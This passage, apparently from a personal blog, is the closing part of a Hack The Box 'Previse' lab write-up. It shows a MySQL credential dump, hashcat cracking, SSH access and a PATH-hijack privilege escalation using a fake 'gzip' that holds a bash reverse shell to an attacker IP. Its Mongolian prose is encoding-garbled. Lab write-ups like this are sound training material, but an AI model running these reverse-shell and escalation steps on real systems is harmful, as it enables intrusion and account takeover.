</span></span></code></pre></div><p>Backup –¥–æ—Ç–æ—Ä—Ö config.php info –¥—ç—ç—Ä—ç—ç—Å —Ö–∞—Ä–∞—Ö–∞–¥ mysql —Ä—É—É –æ—Ä–æ—Ö –±–æ–ª–æ–º–∂—Ç–æ–π:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mysql -u root -D previse -p
</span></span></code></pre></div><p>Tables:</p><pre tabindex=0><code>SHOW TABLES&#39; at line 2
mysql&gt; show tables;
show tables;
+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
2 rows in set (0.00 sec)

mysql&gt; 
</code></pre><p>Accounts:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>mysql&gt; SELECT * FROM accounts;
</span></span><span style=display:flex><span>SELECT * FROM accounts;
</span></span><span style=display:flex><span>+----+----------+------------------------------------+---------------------+
</span></span><span style=display:flex><span>| id | username | password                           | created_at          |
</span></span><span style=display:flex><span>+----+----------+------------------------------------+---------------------+
</span></span><span style=display:flex><span>|  <span style=color:#ae81ff>1</span> | m4lwhere | $1$üßÇllol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
</span></span><span style=display:flex><span>|  <span style=color:#ae81ff>2</span> | ca4mi    | $1$üßÇllol$DHtkJzt.08/KEY8tpvplO0 | 2021-11-10 11:01:53 |
</span></span><span style=display:flex><span>|  <span style=color:#ae81ff>3</span> | ashot    | $1$üßÇllol$eBQMPwAvz9j9ZpK62qDI// | 2021-11-10 11:22:18 |
</span></span><span style=display:flex><span>+----+----------+------------------------------------+---------------------+
</span></span><span style=display:flex><span><span style=color:#ae81ff>3</span> rows in set <span style=color:#f92672>(</span>0.00 sec<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>User: m4lwhere
Password: $1$üßÇllol$DQpmdvnb7EeuO6UaqRItf.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hashcat -a <span style=color:#ae81ff>3</span> -m <span style=color:#ae81ff>500</span> hash.txt rockyou.txt
</span></span></code></pre></div><p><strong>ilovecody112235!</strong></p><p>SHH —Ö–∞–Ω–¥–∞—Ö</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh m4lwhere@10.10.11.104
</span></span></code></pre></div><p>User.txt</p><pre tabindex=0><code>90a************
</code></pre><h3 id=6-privilege-escalation>6. Privilege Escalation<a hidden class=anchor aria-hidden=true href=#6-privilege-escalation>#</a></h3><p><code>sudo -l</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>m4lwhere@previse:~$ sudo -l
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> m4lwhere: 
</span></span><span style=display:flex><span>User m4lwhere may run the following commands on previse:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> /opt/scripts/access_backup.sh
</span></span></code></pre></div><p><strong>/opt/scripts/access_backup.sh</strong></p><p>@vm:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>9001</span>
</span></span></code></pre></div><p>@Machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.139/9001 0&gt;&amp;1&#34;</span> &gt; gzip
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod <span style=color:#ae81ff>777</span> gzip
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>export PATH<span style=color:#f92672>=</span>/tmp:$PATH
</span></span></code></pre></div><p><code>/tmp</code> –¥–æ—Ç–æ—Ä –±–∞–π–≥–∞–∞ –±–æ–ª–æ—Ö–æ–æ—Ä –±–∏—á–ª—ç—ç. ”®”©—Ä –≥–∞–∑–∞—Ä –±–∞–π–≥–∞–∞ –±–æ–ª **<strong>$(pwd):$PATH</strong></p><p><code>sudo -l</code>-—Å –≥–∞—Ä—á –∏—Ä—Å—ç–Ω <code>.sh</code> run:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo /opt/scripts/access_backup.sh
</span></span></code></pre></div><p>root.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>9dc5eb************
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://cadil.github.io/tags/writeup/>Writeup</a></li></ul><nav class=paginav><a class=prev href=https://cadil.github.io/posts/2024-02-24-htb-horizontall-writeup/><span class=title>¬´ —≤–º–Ω—≥—Ö</span><br><span>HTB - Horizontall</span>
</a><a class=next href=https://cadil.github.io/posts/2024-02-22-htb-static-writeup/><span class=title>–î–∞—Ä–∞–∞—Ö ¬ª</span><br><span>HTB - Static</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://cadil.github.io/>CaDiL's Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="—Ö—É—É–ª–∞—Ö";function s(){t.innerHTML="—Ö—É—É–ª—Å–∞–Ω!",setTimeout(()=>{t.innerHTML="—Ö—É—É–ª–∞—Ö"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>